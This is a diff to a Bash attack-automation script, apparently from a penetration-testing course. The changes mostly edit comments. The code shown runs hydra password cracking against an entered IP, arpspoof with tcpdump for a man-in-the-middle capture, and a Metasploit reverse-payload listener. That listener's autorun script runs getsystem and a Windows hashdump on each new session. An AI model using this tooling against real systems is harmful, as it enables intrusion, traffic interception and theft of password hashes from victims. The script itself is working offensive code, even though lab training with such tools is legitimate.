@@ -128,7 +128,7 @@ function instmsfconsole()
 
 }
 
-#2. allow user to choose two methods of scanning and two different network attacks to run via your script e.g. nmap, masscan, msfconsole, hydra ,mitm
+#2a. Allow user to choose between two methods of scanning (nmap and masscan), when selected, script will check if the tool is installed.
 function choosetool()
 {
 	#allow the user to choose different scans between nmap and masscan
@@ -146,6 +146,7 @@ function choosetool()
 	esac		
 }
 
+#2b. Allow user to choose among 3 different network attacks (hydra, mitm, reverse payload) to run via script, when attack tool is selected, script will check if tool is installed
 function chooseattack()
 {
 	#allow the user to choose different scans between nmap and masscan
@@ -166,9 +167,9 @@ function chooseattack()
 	esac
 
 }
-#3. log executed attacks: every scan or attack should be logged and saved with the date and used arguments
+#3. Run selected scan log executed attacks: every scan or attack should be logged and saved with the date and used arguments
 
-#use this function to save results such as date,time,IPs, kind of attack
+#use this function for user to enter scan details like IP, PORT, filename and flags needed for scan
 function scandetails()
 {
 	echo '**Please give the following details for scan..'
@@ -179,7 +180,7 @@ function scandetails()
 	
 }
 
-#use this function to run nmap
+#use this function to run nmap, and log scan results
 function runnmap()
 {
 	scandetails
@@ -200,7 +201,7 @@ function runnmap()
 	esac
 }
 
-#use this function to run masscan
+#use this function to run masscan and log scan results
 function runmasscan()
 {
 	scandetails
@@ -220,7 +221,7 @@ function runmasscan()
 	esac
 	
 }
-	
+#use this function to run hydra for specified IP, service and log results into file	
 function runhydra()
 { 	read -p "Please enter IP to crack: " IPHYD	
 	read -p "Please enter filename for hydra results: " HYDRA
@@ -237,7 +238,7 @@ cat $HYDRA | grep password:
 	
 }
 
-
+#use this function to run man in the middle attack (MITM) using arpspoof based on entered IPs, user can specify the duration of MITM
 function runarp()
 {
 	read -p "Please enter router ip address you want to spoof: " ROUTERIP
@@ -257,7 +258,7 @@ echo "**Currently running arp spoof and capturing packets into $PKTFILE.cap.."
 	timeout $TIME tcpdump -w $PKTFILE.cap
 HERE
 }
-
+#use this function to 1) create payload 2) start listener and 3) execute a series of commands automatically when there is a a session, details will be logged in a file
 function runmsfconsole()
 {
 	echo "This will create a reverse payload for windows"
@@ -277,7 +278,9 @@ function runmsfconsole()
 	getsystem
 	run post/windows/gather/hashdump
 	background" > autorun.rc
+	#autorun.rc will run automatically when there is a session, this will give ipconfig, sysinfo, enum_shares, and check whether the system is a VM, and get privilege escalation to obtain password hashdump from the windows
 	echo "**Done! Starting msfconsole.."
+	#spool will save logs into file
 	echo "spool $RESFILE
 	set AutoRunScript multi_console_command -r autorun.rc
 	use exploit/multi/handler
@@ -290,5 +293,5 @@ msfconsole -r runmeterpreter.rc
 	
 }
 
-
+choosetool
 chooseattack
